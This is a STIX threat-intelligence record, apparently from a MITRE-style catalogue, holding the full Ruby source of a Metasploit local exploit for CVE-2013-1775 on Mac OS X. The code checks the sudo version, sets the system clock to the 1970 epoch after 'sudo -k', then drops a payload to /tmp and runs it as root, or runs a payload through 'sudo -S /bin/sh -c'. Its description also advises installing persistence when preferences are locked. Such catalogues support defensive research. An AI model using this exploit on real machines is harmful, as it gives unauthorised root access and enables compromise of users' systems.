{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a0d9130-912f-4722-8344-b7851493f0b4",
    "created": "2024-08-14T16:34:41.5623Z",
    "modified": "2024-08-14T16:34:41.562305Z",
    "name": "Mac OS X Sudo Password Bypass",
    "description": " This module gains a session with root permissions on versions of OS X with",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/sudo_password_bypass.rb",
            "external_id": "sudo_password_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1775"
        },
        {
            "source_name": "reference",
            "url": "http://www.sudo.ws/sudo/alerts/epoch_ticket.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'shellwords'\n\nclass MetasploitModule < Msf::Exploit::Local\n\n  # ManualRanking because it's going to modify system time\n  # Even when it will try to restore things, user should use\n  # it at his own risk\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  SYSTEMSETUP_PATH = \"/usr/sbin/systemsetup\"\n  VULNERABLE_VERSION_RANGES = [['1.6.0', '1.7.10p6'], ['1.8.0', '1.8.6p6']]\n  CMD_TIMEOUT = 45\n\n  # saved clock config\n  attr_accessor :clock_changed, :date, :network_server, :networked, :time, :zone\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Mac OS X Sudo Password Bypass',\n      'Description'   => %q{\n        This module gains a session with root permissions on versions of OS X with\n        sudo binary vulnerable to CVE-2013-1775. Tested working on Mac OS 10.7-10.8.4,\n        and possibly lower versions.\n\n        If your session belongs to a user with Administrative Privileges\n        (the user is in the sudoers file and is in the \"admin group\"), and the\n        user has ever run the \"sudo\" command, it is possible to become the super\n        user by running `sudo -k` and then resetting the system clock to 01-01-1970.\n\n        This module will fail silently if the user is not an admin, if the user has never\n        run the sudo command, or if the admin has locked the Date/Time preferences.\n\n        Note: If the user has locked the Date/Time preferences, requests to overwrite\n        the system clock will be ignored, and the module will silently fail. However,\n        if the \"Require an administrator password to access locked preferences\" setting\n        is not enabled, the Date/Time preferences are often unlocked every time the admin\n        logs in, so you can install persistence and wait for a chance later.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Todd C. Miller', # Vulnerability discovery\n          'joev', # Metasploit module\n          'juan vazquez' # testing/fixing module bugs\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2013-1775' ],\n          [ 'OSVDB', '90677' ],\n          [ 'BID', '58203' ],\n          [ 'URL', 'http://www.sudo.ws/sudo/alerts/epoch_ticket.html' ]\n        ],\n      'Platform'      => 'osx',\n      'Arch'          => [ ARCH_X86, ARCH_X64, ARCH_CMD ],\n      'SessionTypes'  => [ 'shell', 'meterpreter' ],\n      'Targets'       => [\n        [ 'Mac OS X x86 (Native Payload)',\n          {\n            'Platform' => 'osx',\n            'Arch' => ARCH_X86\n          }\n        ],\n        [ 'Mac OS X x64 (Native Payload)',\n          {\n            'Platform' => 'osx',\n            'Arch' => ARCH_X64\n          }\n        ],\n        [ 'CMD',\n          {\n            'Platform' => 'unix',\n            'Arch' => ARCH_CMD\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2013-02-28'\n    ))\n    register_advanced_options([\n      OptString.new('TMP_FILE',\n        [true,'For the native targets, specifies the path that '+\n          'the executable will be dropped on the client machine.',\n          '/tmp/.<random>/<random>']\n      ),\n    ])\n  end\n\n  # ensure target is vulnerable by checking sudo vn and checking\n  # user is in admin group.\n  def check\n    if cmd_exec(\"sudo -V\") =~ /version\\s+([^\\s]*)\\s*$/\n      sudo_vn = $1\n      sudo_vn_parts = sudo_vn.split(/[\\.p]/).map(&:to_i)\n      # check vn between 1.6.0 through 1.7.10p6\n      # and 1.8.0 through 1.8.6p6\n      if not vn_bt(sudo_vn, VULNERABLE_VERSION_RANGES)\n        vprint_error \"sudo version #{sudo_vn} not vulnerable.\"\n        return CheckCode::Safe\n      end\n    else\n      vprint_error \"sudo not detected on the system.\"\n      return CheckCode::Safe\n    end\n\n    # check that the user is in OSX's admin group, necessary to change sys clock\n    unless is_admin?\n      vprint_error \"sudo version is vulnerable, but user is not in the admin group (necessary to change the date).\"\n      return CheckCode::Safe\n    end\n\n    # one root for you sir\n    CheckCode::Vulnerable\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless is_admin?\n      fail_with Failure::NoAccess, \"User is not in the 'admin' group, bailing.\"\n    end\n\n    if check != CheckCode::Vulnerable\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    # \"remember\" the current system time/date/network/zone\n    print_good(\"User is an admin, continuing...\")\n\n    print_status(\"Saving system clock config...\")\n    @time = cmd_exec(\"#{SYSTEMSETUP_PATH} -gettime\").match(/^time: (.*)$/i)[1]\n    @date = cmd_exec(\"#{SYSTEMSETUP_PATH} -getdate\").match(/^date: (.*)$/i)[1]\n    @networked = cmd_exec(\"#{SYSTEMSETUP_PATH} -getusingnetworktime\") =~ (/On$/)\n    @zone = cmd_exec(\"#{SYSTEMSETUP_PATH} -gettimezone\").match(/^time zone: (.*)$/i)[1]\n    @network_server = if @networked\n      cmd_exec(\"#{SYSTEMSETUP_PATH} -getnetworktimeserver\").match(/time server: (.*)$/i)[1]\n    end\n\n    run_sudo_cmd\n  end\n\n  def cleanup\n    if @clock_changed\n      print_status(\"Resetting system clock to original values\") if @time\n      cmd_exec(\"#{SYSTEMSETUP_PATH} -settimezone #{[@zone].shelljoin}\") unless @zone.nil?\n      cmd_exec(\"#{SYSTEMSETUP_PATH} -setdate #{[@date].shelljoin}\") unless @date.nil?\n      cmd_exec(\"#{SYSTEMSETUP_PATH} -settime #{[@time].shelljoin}\") unless @time.nil?\n      if @networked\n        cmd_exec(\"#{SYSTEMSETUP_PATH} -setusingnetworktime On\")\n        unless @network_server.nil?\n          cmd_exec(\"#{SYSTEMSETUP_PATH} -setnetworktimeserver #{[@network_server].shelljoin}\")\n        end\n      end\n      print_good(\"Completed clock reset.\")\n    else\n      print_status \"Skipping cleanup since the clock was never changed\"\n    end\n\n    super\n  end\n\n  private\n\n  def run_sudo_cmd\n    print_status(\"Resetting user's time stamp file and setting clock to the epoch\")\n    cmd_exec(\n      \"sudo -k; \\n\"+\n      \"#{SYSTEMSETUP_PATH} -setusingnetworktime Off -settimezone GMT\"+\n      \" -setdate 01:01:1970 -settime 00:00\"\n    )\n    if not cmd_exec(\"#{SYSTEMSETUP_PATH} -getdate\").match(\"1/1/1970\")\n      fail_with(Failure::NoAccess, \"Date and time preference pane appears to be locked. By default, this pane is unlocked upon login.\")\n    else\n      @clock_changed = true\n    end\n\n    # drop the payload (unless CMD)\n    if using_native_target?\n      cmd_exec(\"mkdir -p #{File.dirname(drop_path)}\")\n      write_file(drop_path, generate_payload_exe)\n      register_files_for_cleanup(drop_path)\n      cmd_exec(\"chmod +x #{[drop_path].shelljoin}\")\n      print_status(\"Payload dropped and registered for cleanup\")\n    end\n\n    # Run Test\n    test = rand_text_alpha(4 + rand(4))\n    sudo_cmd_test = ['sudo', '-S', [\"echo #{test}\"].shelljoin].join(' ')\n\n    print_status(\"Testing that user has sudoed before...\")\n    output = cmd_exec('echo \"\" | ' + sudo_cmd_test)\n\n    if output =~ /incorrect password attempts\\s*$/i\n      fail_with(Failure::NotFound, \"User has never run sudo, and is therefore not vulnerable. Bailing.\")\n    elsif output =~ /#{test}/\n      print_good(\"Test executed succesfully. Running payload.\")\n    else\n      print_error(\"Unknown fail while testing, trying to execute the payload anyway...\")\n    end\n\n    # Run Payload\n    sudo_cmd_raw = if using_native_target?\n      ['sudo', '-S', [drop_path].shelljoin].join(' ')\n    elsif using_cmd_target?\n      ['sudo', '-S', '/bin/sh', '-c', [payload.encoded].shelljoin].join(' ')\n    end\n\n    ## to prevent the password prompt from destroying session\n    ## backgrounding the sudo payload in order to keep both sessions usable\n    sudo_cmd = 'echo \"\" | ' + sudo_cmd_raw + ' & true'\n\n    print_status \"Running command: \"\n    print_line sudo_cmd\n    output = cmd_exec(sudo_cmd)\n\n  end\n\n  # default cmd_exec timeout to CMD_TIMEOUT constant\n  def cmd_exec(cmd, args=nil, timeout=CMD_TIMEOUT)\n    super\n  end\n\n  # helper methods for accessing datastore\n  def using_native_target?\n    target.name =~ /native/i\n  end\n\n  def using_cmd_target?\n    target.name =~ /cmd/i\n  end\n\n  def drop_path\n    @_drop_path ||= datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10) }\n  end\n\n  # helper methods for dealing with sudo's vn num\n  def parse_vn(vn_str)\n    vn_str.split(/[\\.p]/).map(&:to_i)\n  end\n\n  def vn_bt(vn, ranges) # e.g. ('1.7.1', [['1.7.0', '1.7.6p44']])\n    vn_parts = parse_vn(vn)\n    ranges.any? do |range|\n      min_parts = parse_vn(range[0])\n      max_parts = parse_vn(range[1])\n      vn_parts.all? do |part|\n        min = min_parts.shift\n        max = max_parts.shift\n        (min.nil? or (not part.nil? and part >= min)) and\n          (part.nil? or (not max.nil? and part <= max))\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-02-28",
    "x_mitre_platforms": [
        "unix'"
    ]
}